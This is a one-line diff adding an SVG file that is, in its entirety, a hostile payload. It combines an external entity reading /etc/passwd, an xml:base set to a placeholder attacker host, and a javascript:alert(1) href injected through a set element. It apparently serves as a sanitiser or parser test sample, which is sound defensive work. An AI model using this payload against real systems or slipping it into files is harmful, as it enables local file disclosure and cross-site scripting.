@@ -1,0 +1,1 @@
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xml:base="https://evil.invalid/"><rect><set attributeName="href" to="javascript:alert(1)"/></rect></svg>
